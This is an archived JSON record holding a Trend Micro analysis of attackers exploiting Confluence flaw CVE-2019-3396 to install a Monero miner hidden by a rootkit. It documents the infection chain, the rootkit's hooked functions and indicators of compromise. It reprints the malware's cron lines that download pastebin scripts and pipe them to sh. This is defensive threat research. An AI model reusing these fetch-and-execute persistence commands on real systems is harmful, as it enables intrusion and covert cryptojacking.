{
    "id": "5ff7e877-eeaf-445a-aeec-c71242619a7e",
    "created_at": "2023-01-12T15:06:28.90094Z",
    "updated_at": "2025-03-27T02:09:07.876919Z",
    "deleted_at": null,
    "sha1_hash": "7b496976a400c900a4257daa2f5ebe238d2c31ae",
    "title": "2019-05-07 - CVE-2019-3396 Redux- Confluence Vulnerability Exploited to Deliver Cryptocurrency Miner With Rootkit",
    "authors": "",
    "file_creation_date": "2022-05-28T02:51:30Z",
    "file_modification_date": "2022-05-28T02:51:30Z",
    "file_size": 222337,
    "plain_text": "# CVE-2019-3396: Exploiting the Confluence Vulnerability\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-3396-redux-confluence-vulnerability-exploited-to-deliver-cryptocurrency-miner-with-rootkit/](https://blog.trendmicro.com/trendlabs-security-intelligence/cve-2019-3396-redux-confluence-vulnerability-exploited-to-deliver-cryptocurrency-miner-with-rootkit/)**\n\nMay 7, 2019\n\n[In March 2019, Atlassian published an advisory covering two critical vulnerabilities involving Confluence, a widely used collaboration](https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html)\n[and planning software. In April, we observed one of these vulnerabilities, the widget connector vulnerability CVE-2019-3396, being](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)\n[exploited by threat actors to perform malicious attacks. Security provider Alert Logic also discovered the vulnerability being exploited](https://blog.trendmicro.com/en_us/research/19/d/aesddos-botnet-malware-exploits-cve-2019-3396-to-perform-remote-code-execution-ddos-attacks-and-cryptocurrency-mining.html)\nto [drop the Gandcrab ransomware.](https://www.alertlogic.com/blog/active-exploitation-of-confluence-vulnerability-cve-2019-3396-dropping-gandcrab-ransomware/)\n\nIt seems that these incidents are not the last we’ve seen of the CVE-2019-3396 exploitation, as threat actors are still finding new\nways to exploit the vulnerability. We discovered that it is also being used to deliver a cryptocurrency-mining malware containing a\n[rootkit that was designed to hide its activities. This technique is highly reminiscent of another attack that occurred in November 2018](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/cryptocurrency-mining-malware-targets-linux-systems-uses-rootkit-for-stealth)\nthat used a similar miner-rootkit combination.\n\n## Arrival and propagation\n\n[Figure 1. Infection chain](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-1.jpg)\n\nFigure 1. Infection chain\n\nThe attack begins with a remote command sent to download a shell script from pastebin (hxxps://pastebin[.]com/MjGrx7EA).\n\nThis shell script kills certain processes and then downloads and executes “lsd_1” from another pastebin\n(hxxps://pastebin[.]com/CvJM3qz5). This file is a second shell script that will drop a third shell script, “lsd_2,” sourced from yet\nanother pastebin (hxxps://pastebin[.]com/a3EAddwq).\n\nThis shell script is responsible for downloading a trojan dropper from the following servers:\n\ngwjyhs[.]com\nimg[.]sobot[.]com\n\nThe malware, kerberods (detected as Trojan.Linux.KERBERDS.A), is a custom-packed binary that installs itself via cron jobs:\n\n*/10* * * * curl -fsSL hxxps://pastebin[.]com/raw/60T3uCcb|sh\n*/15* * * * wget -q -O- hxxps://pastebin[.]com/raw/60T3uCcb|sh\n*/10* * * * root curl -fsSL hxxps://pastebin[.]com/raw/60T3uCcb|sh\n*/15* * * * root wget -q -O- hxxps://pastebin[.]com/raw/60T3uCcb|sh\n*/15* * * * (curl -fsSL hxxps://pastebin[.]com/raw/rPB8eDpu||wget -q -O-hxxps://pastebin[.]com/raw/rPB8eDpu)|sh\n\nKerberods is responsible for dropping the cryptocurrency miner (khugepageds, detected as Coinminer.Linux.MALXMR.UWEJI) and\nits rootkit component.\n\nOne particularly interesting aspect of the binary is the way it drops the rootkit. First, it writes the code for the rootkit to a file named\n_/usr/local/lib/{random filename}.c._\n\n\n-----\n\n[Figure 2. Writing the rootkit code](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-2.jpg)\n\nFigure 2. Writing the rootkit code\n\nThe rootkit is then compiled via gcc, with the output binary being /usr/local/lib/{random filename}.so.\n\n[Figure 3. Compiling the rootkit codeFigure 3. Compiling the rootkit code](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-3.jpg)\n\nKerberods also has multiple ways of propagating itself, spreading via SSH and exploiting CVE-2019-1003001 and CVE-20191003000.\n\nAs for khugepageds, it is an XMRig 2.14.1-mo1 Monero miner with a config that is hardcoded into the binary:\n\nFigure 4. The miner’s config\n\nThe mining pool can be accessed at systemten[.]org:51640.\n\n## Rootkit as evasion method\n\nAs mentioned earlier, this attack shares many of the same characteristics of last year’s incident, such as the use of pastebin as a\nC&C server, the miner payload, and its use of a rootkit to hide the malware.\n\nLike kerberods, the miner payload also uses a custom packer to impede analysis.\n\n[Figure 5. The custom packer used for the cryptocurrency-mining malware](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-5.jpg)\n\nFigure 5. The custom packer used for the cryptocurrency-mining malware\n\nUnlike the older rootkit that only hooks the readdir function to hide the mining process, this new version hooks more functions. It\nhides not only the mining process but also certain files and network traffic. It is also capable of forging the machine’s CPU usage.\n\nThe hooked functions are shown below:\n\nfopen\nfopen64\nlstat\nlxstat\nopen\nrmdir\nstat\nstat64\n__xstat\n__xstat64\nunlink\nunlinkat\nopendir\nreaddir\nreaddir6\n\nMost of the hooked functions would return a “No such file or directory error” if their parameter contains the file name of the rootkit, the\nminer, or ld.so.preload.\n\n[Figure 6. Hooked functions returning an error to hide the infection](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-6.jpg)\n\nFigure 6. Hooked functions returning an error to hide the infection\n\nThe following image shows the htop system monitor output with and without the rootkit loaded. Note how the version with the rootkit\nloaded hides the CPU usage and the mining process.\n\n[Figure 7. Comparison of the htop system monitor output showing the version with (right) and without (left) the rootkit present](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-7.jpg)\n\nFigure 7. Comparison of the htop system monitor output showing the version with (right) and without (left) the rootkit present\n\n[Figure 8. Netstat output before (left) and after (right) the rootkit is loaded](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-8.jpg)\n\n\n-----\n\nFigure 8. Netstat output before (left) and after (right) the rootkit is loaded\n\n[Figure 9. Functions for forging CPU usage and TCP connections](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-9.jpg)\n\nFigure 9. Functions for forging CPU usage and TCP connections\n\n[Figure 10. Forging network traffic](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-10.jpg)\n\nFigure 10. Forging network traffic\n\n[Figure 11. Forging CPU usage](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-11.jpg)\n\nFigure 11. Forging CPU usage\n\nThe rootkit also serves as a form of persistence by hooking the access function so that a cron job is created to reinstall the malware\nwhenever it is called.\n\n[Figure 12. Code showing the cron job used to download and execute kerberods](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/05/confluence-redux-12.jpg)\n\nFigure 12. Code showing the cron job used to download and execute kerberods\n\n## Security recommendations and solutions\n\nWe’ve seen multiple attacks involving CVE-2019-3396 within a short span of time. This shows that cybercriminals are willing and able\n[to abuse any vulnerability in multiple ways. This emphasizes that continuous monitoring is needed to detect any threats in an](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/automating-security-continuous-monitoring-and-auditing-in-devops)\norganization’s environment.\n\nFor effective monitoring, organizations can look into the Trend Micro ™ [Hybrid Cloud Security solution, which provides powerful,](https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html)\n[streamlined, and automated security within the DevOps pipeline. It also provides multiple XGen™ threat defense techniques for](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/security-teams.html)\n[protecting physical, virtual, and cloud workloads. In addition, it protects containers via the Deep Security and™](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/deep-security-for-cloud.html) Deep Security Smart\nCheck solutions, which help DevOps and security teams scan and ensure the security of container images during preruntime and\nruntime.\n\n\nThe [Trend Micro Deep Security solution protects user systems from threats that may target the following vulnerability rule:](https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html)\n\n1009705 - Atlassian Confluence Server Remote Code Execution Vulnerability (CVE-2019-3396)\n\n**Indicators of Compromise (IoCs)**\n\n**Details** **Hashes (SHA-256)** **Detection Name**\n\n\nkerberods\n(coinminer\nbinary)\n\nkhugepageds\n(cryptocurrency\nmining\nmalware)\n\nrandom.so\n(rootkit)\n\nCloud\n\n\na9228b6a3fe0b8375d6b881626fd4b59fbbf54dbd60a94b085ee0455b3d18fe9 Trojan.Linux.KERBERDS.A\n\n25064a5ab78cdd36e7049d00b9319222906dd634908c1858e2262bf333631213 Coinminer.Linux.MALXMR.UWEJI\n\n3392589c9ebbf7600035574e338d69625cd5ce83ee655582fe8bbadb663532b3 Rootkit.Linux.KERBERDS.A\n\n\nWe discovered the Confluence vulnerability CVE-2019-3396 being used to deliver a cryptocurrency-mining malware containing a\nrootkit that was designed to hide its activities.\n\nBy: Augusto Remillano II, Robert Malagad May 07, 2019 Read time: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-07 - CVE-2019-3396 Redux- Confluence Vulnerability Exploited to Deliver Cryptocurrency Miner With Rootkit.pdf"
    ],
    "report_names": [
        "2019-05-07 - CVE-2019-3396 Redux- Confluence Vulnerability Exploited to Deliver Cryptocurrency Miner With Rootkit.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535988,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653706290,
    "ts_modification_date": 1653706290,
    "files": {
        "pdf": "https://archive.orkl.eu/7b496976a400c900a4257daa2f5ebe238d2c31ae.pdf",
        "text": "https://archive.orkl.eu/7b496976a400c900a4257daa2f5ebe238d2c31ae.txt",
        "img": "https://archive.orkl.eu/7b496976a400c900a4257daa2f5ebe238d2c31ae.jpg"
    }
}